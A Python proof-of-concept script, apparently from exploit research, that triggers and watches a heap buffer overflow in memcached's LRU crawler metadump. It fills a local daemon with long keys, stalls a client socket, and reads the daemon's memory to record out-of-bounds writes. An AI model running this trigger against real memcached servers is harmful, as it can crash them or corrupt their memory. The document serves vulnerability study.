#!/usr/bin/env python3
"""Observe the crawler output buffer in a live plain (non-ASan) memcached daemon.

The observer is the daemon's parent, so reading /proc/<pid>/mem is permitted
under yama ptrace_scope=1.  No breakpoint, signal or ptrace stop is delivered
to the daemon: the crawler's 1000 ms poll() timeout is left intact.  The ELF
load base comes from /proc/<pid>/maps and the pinned global from nm; the
crawler_client_t layout is from the pinned crawler.c:28-34, 53-59.

  +0 data, +8 c.c, +16 c.sfd, +20 c.buflen, +24 c.bufused, +32 c.buf,
  +40 mod, +48 status.

All traffic is 127.0.0.1; no external address is contacted.
"""
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time

HOST = "127.0.0.1"
KEYLEN = 240
BUFLEN = 131072
DEFAULTS = dict(port=22138, keys=8000, keybyte="0x5a", hold=85,
                binary="lab/frontier/memcached2shell/daemon/parent-plain/memcached",
                symbol=0x54320)


def connect(port):
    end = time.monotonic() + 30
    while time.monotonic() < end:
        try:
            return socket.create_connection((HOST, port), timeout=5)
        except OSError:
            time.sleep(0.1)
    raise SystemExit("daemon never listened on %s:%d" % (HOST, port))


def elf_base(pid, binary):
    """Lowest mapping of the daemon PIE at file offset 0."""
    best = None
    with open("/proc/%d/maps" % pid) as fh:
        for line in fh:
            if binary not in line:
                continue
            match = re.match(r"([0-9a-f]+)-([0-9a-f]+) r--p 00000000", line)
            if match:
                addr = int(match.group(1), 16)
                if best is None or addr < best:
                    best = addr
    return best


def buffer_mapping(pid, buf):
    with open("/proc/%d/maps" % pid) as fh:
        for line in fh:
            match = re.match(r"([0-9a-f]+)-([0-9a-f]+)", line)
            if match and int(match.group(1), 16) <= buf < int(match.group(2), 16):
                return line.strip()
    return "UNMAPPED"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=DEFAULTS["port"])
    ap.add_argument("--keys", type=int, default=DEFAULTS["keys"])
    ap.add_argument("--keybyte", default=DEFAULTS["keybyte"])
    ap.add_argument("--hold", type=int, default=DEFAULTS["hold"])
    ap.add_argument("--binary", default=DEFAULTS["binary"])
    ap.add_argument("--symbol", type=lambda x: int(x, 0),
                    default=DEFAULTS["symbol"])
    ap.add_argument("--out", help="write the raw trace to this path")
    args = ap.parse_args()

    keybyte = bytes([int(args.keybyte, 0)])
    trace = []
    def emit(line):
        print(line, flush=True)
        trace.append(line)

    mem = None
    client = None
    log = open("/tmp/memcached-observe-heap.log", "wb")
    daemon = subprocess.Popen(
        [args.binary, "-l", HOST, "-p", str(args.port), "-U", "0", "-m", "64",
         "-u", "mesh-home", "-o", "lru_crawler_sleep=0", "-v"],
        stdout=log, stderr=subprocess.STDOUT)
    emit("daemon pid %d; symbol %#x" % (daemon.pid, args.symbol))
    try:
        store = connect(args.port)
        fh = store.makefile("rb")
        for i in range(args.keys):
            key = keybyte * KEYLEN + (b"%05d" % i)
            store.sendall(b"set " + key + b" 0 0 1\r\nx\r\n")
            if fh.readline() != b"STORED\r\n":
                raise SystemExit("store failed at %d" % i)
        fh.close(); store.close()
        emit("stored %d keys of byte %r" % (args.keys, keybyte))

        client = connect(args.port)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        client.sendall(b"lru_crawler metadump all\r\n")
        emit("metadump issued at t=0; holding socket open")

        start = time.monotonic()
        first_oob = False
        global_addr = None
        while time.monotonic() - start < args.hold:
            if daemon.poll() is not None:
                emit("daemon DIED rc=%s at t=%.1fs" %
                     (daemon.returncode, time.monotonic() - start))
                break
            if global_addr is None:
                base = elf_base(daemon.pid, args.binary)
                if base is None:
                    raise SystemExit("could not find daemon ELF base")
                global_addr = base + args.symbol
                mem = os.open("/proc/%d/mem" % daemon.pid, os.O_RDONLY)
                emit("ELF base %#x; active_crawler_mod @ %#x" %
                     (base, global_addr))

            raw = os.pread(mem, 56, global_addr)
            if len(raw) != 56:
                emit("short global read: %d bytes" % len(raw))
                break
            _data, _conn, sfd, buflen, bufused, buf, _mod, status = \
                struct.unpack_from("<QQiiqQQi", raw, 0)
            bufused &= 0xFFFFFFFF  # +24 is int; +28 is padding
            now = time.monotonic() - start
            emit("t=%5.1fs sfd=%d buflen=%d bufused=%d buf=%#x status=%d alive=%s" %
                 (now, sfd, buflen, bufused, buf, status, daemon.poll() is None))
            if buf and bufused > BUFLEN:
                if not first_oob:
                    first_oob = True
                    emit("FIRST OBSERVED OVERFLOW at t=%.1fs" % now)
                    emit("buffer mapping: %s" % buffer_mapping(daemon.pid, buf))
                samples = []
                for delta in (0, 4, 16, 64, 512, 1024, 2048, 4096, 8192, 16384):
                    try:
                        raw_sample = os.pread(mem, 12, buf + BUFLEN + delta)
                        samples.append("%d:%s" % (delta, raw_sample.hex()))
                    except OSError as exc:
                        samples.append("%d:ERR(%d)" % (delta, exc.errno))
                emit("  OOB samples " + " ".join(samples))
            time.sleep(2)
        else:
            emit("deadline reached, daemon alive=%s" % (daemon.poll() is None))
    finally:
        if client is not None:
            client.close()
        if mem is not None:
            os.close(mem)
        if daemon.poll() is None:
            daemon.terminate()
            try:
                daemon.wait(timeout=5)
            except subprocess.TimeoutExpired:
                daemon.kill()
        emit("final rc=%s" % daemon.returncode)
        log.close()
        if args.out:
            with open(args.out, "w") as fh:
                fh.write("\n".join(trace) + "\n")


if __name__ == "__main__":
    main()
